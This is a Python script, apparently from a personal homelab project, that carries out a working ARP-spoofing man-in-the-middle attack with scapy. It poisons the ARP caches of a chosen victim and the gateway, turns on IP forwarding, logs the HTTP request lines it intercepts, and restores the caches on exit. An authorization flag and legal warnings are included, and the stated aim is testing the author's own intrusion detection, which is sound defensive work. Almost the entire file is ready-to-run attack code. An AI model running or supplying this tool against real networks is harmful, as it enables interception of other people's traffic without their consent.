#!/usr/bin/env python3
"""
MITM Proxy (ARP spoofing) - Robert Mircea
Homelab Project - OFFENSIVE (red-team pair for packet-sniffer / ids IDS-005)

Performs a classic bidirectional ARP-cache-poisoning man-in-the-middle between
a victim and the gateway on the local segment, then passively logs the
intercepted HTTP requests. Restores the ARP tables on exit.

Scope: ARP spoofing only works on the local L2 segment, so this is inherently
LAN-local. It still requires an explicit --i-own-this-target acknowledgement,
because running it against machines you do not own is illegal. Use it to
validate your own blue-team tooling (packet-sniffer ARP detection, IDS-005).
Requires root.
"""

import argparse
import os
import sys
import time

try:
    from scapy.all import ARP, Ether, IP, TCP, Raw, srp, send, sniff, get_if_hwaddr
    SCAPY = True
except ImportError:
    SCAPY = False


def get_mac(ip, interface):
    """Resolve the MAC address for an IP via an ARP who-has request."""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2, iface=interface, verbose=0,
    )
    for _, rcv in ans:
        return rcv[Ether].src
    return None


def build_arp_reply(target_ip, target_mac, spoof_ip, attacker_mac):
    """
    Build an ARP reply that tells `target_ip` that `spoof_ip` is at our MAC.

    This is the core poisoning primitive: op=2 (is-at), psrc=spoof_ip,
    hwsrc=attacker_mac, pdst/hwdst = the victim we are lying to.
    """
    return ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=attacker_mac,
    )


def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
    """Send correct ARP mappings to both parties to heal their caches."""
    print("[MITM] Restoring ARP tables...")
    # Tell the victim the real gateway MAC, and vice versa (repeat for reliability).
    send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
             psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=0)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
             psrc=victim_ip, hwsrc=victim_mac), count=5, verbose=0)


def set_ip_forward(enabled):
    """Enable/disable kernel IP forwarding so traffic still flows through us."""
    value = "1" if enabled else "0"
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write(value)
    except OSError as e:
        print(f"[WARN] Could not set ip_forward ({e}); victim traffic may drop.")


def log_http(packet):
    """Passively log intercepted HTTP request lines."""
    if packet.haslayer(Raw) and packet.haslayer(TCP):
        try:
            payload = packet[Raw].load.decode("utf-8", errors="ignore")
        except Exception:
            return
        if payload.startswith(("GET", "POST", "PUT", "HEAD")):
            src = packet[IP].src if packet.haslayer(IP) else "?"
            first_line = payload.splitlines()[0]
            print(f"[INTERCEPT] {src} -> {first_line}")


def run(victim_ip, gateway_ip, interface, duration):
    """Run the ARP-spoof MITM for `duration` seconds, then restore."""
    if os.geteuid() != 0:
        print("[ERROR] Root required for ARP spoofing (run with sudo).")
        sys.exit(1)

    attacker_mac = get_if_hwaddr(interface)
    print(f"[MITM] Resolving MACs on {interface}...")
    victim_mac = get_mac(victim_ip, interface)
    gateway_mac = get_mac(gateway_ip, interface)

    if not victim_mac or not gateway_mac:
        print("[ERROR] Could not resolve victim/gateway MAC. Check IPs/interface.")
        sys.exit(1)

    print(f"[MITM] Victim  {victim_ip} = {victim_mac}")
    print(f"[MITM] Gateway {gateway_ip} = {gateway_mac}")
    print(f"[MITM] Attacker MAC = {attacker_mac}")
    set_ip_forward(True)

    print(f"[MITM] Poisoning for {duration}s. Your IDS/sniffer should alert (IDS-005).\n")
    end = time.time() + duration
    try:
        while time.time() < end:
            # Lie to the victim (we are the gateway) and to the gateway (we are the victim).
            send(build_arp_reply(victim_ip, victim_mac, gateway_ip, attacker_mac), verbose=0)
            send(build_arp_reply(gateway_ip, gateway_mac, victim_ip, attacker_mac), verbose=0)
            sniff(iface=interface, prn=log_http, timeout=2, store=0,
                  filter=f"tcp and host {victim_ip}")
    except KeyboardInterrupt:
        print("\n[MITM] Interrupted.")
    finally:
        restore(victim_ip, victim_mac, gateway_ip, gateway_mac)
        set_ip_forward(False)
        print("[MITM] Done.")


def main():
    parser = argparse.ArgumentParser(
        description="ARP-spoofing MITM (LAN-local; pairs with packet-sniffer / IDS-005)"
    )
    parser.add_argument("-v", "--victim", required=True, help="Victim IP (on your LAN)")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP")
    parser.add_argument("-i", "--interface", required=True, help="Network interface")
    parser.add_argument("-d", "--duration", type=int, default=60,
                        help="Duration in seconds (default: 60)")
    parser.add_argument("--i-own-this-target", action="store_true",
                        help="Required acknowledgement that you are authorized on this LAN")
    args = parser.parse_args()

    if not args.i_own_this_target:
        print("[REFUSED] Add --i-own-this-target to confirm you own/are authorized")
        print("          on this network. ARP spoofing others' machines is illegal.")
        sys.exit(2)

    print("\033[93m[WARNING] ARP spoofing is disruptive and only lawful on networks")
    print("          you own or are explicitly authorized to test.\033[0m\n")

    if not SCAPY:
        print("[ERROR] scapy is required (pip install scapy).")
        sys.exit(1)

    run(args.victim, args.gateway, args.interface, args.duration)


if __name__ == "__main__":
    main()
